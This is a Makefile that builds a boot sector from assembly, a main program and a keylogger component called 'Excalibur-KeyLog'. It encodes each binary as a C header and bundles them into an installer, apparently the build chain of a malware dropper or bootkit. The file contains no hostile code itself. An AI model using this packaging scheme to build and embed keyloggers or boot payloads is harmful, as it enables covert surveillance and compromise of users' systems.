BIN_DIR = bin
OBJ_DIR = bin-int

APP_DIR = Excalibur
LOG_DIR = Excalibur-KeyLog
INS_DIR = Excalibur-Installer
ENC_DIR = $(INS_DIR)/src/Binaries

RELEASE = 0
export RELEASE

all: installer
.PHONY: boot

boot:
	mkdir -p $(BIN_DIR)
	mkdir -p $(OBJ_DIR)
	nasm -f bin -o $(BIN_DIR)/boot.bin boot/boot.asm
	xxd -i $(BIN_DIR)/boot.bin > $(ENC_DIR)/BootBinary.h

excalibur:
	cd $(APP_DIR) && $(MAKE)
	xxd -i $(BIN_DIR)/Excalibur.exe > $(ENC_DIR)/ExcaliburBinary.h

keylogger:
	cd $(LOG_DIR) && $(MAKE)
	xxd -i $(BIN_DIR)/Excalibur-KeyLog.exe > $(ENC_DIR)/KeyLogBinary.h

installer: boot excalibur keylogger
	cd $(INS_DIR) && $(MAKE)

clean:
	rm -rf $(BIN_DIR)
	rm -rf $(OBJ_DIR)
	rm -rf $(ENC_DIR)/*
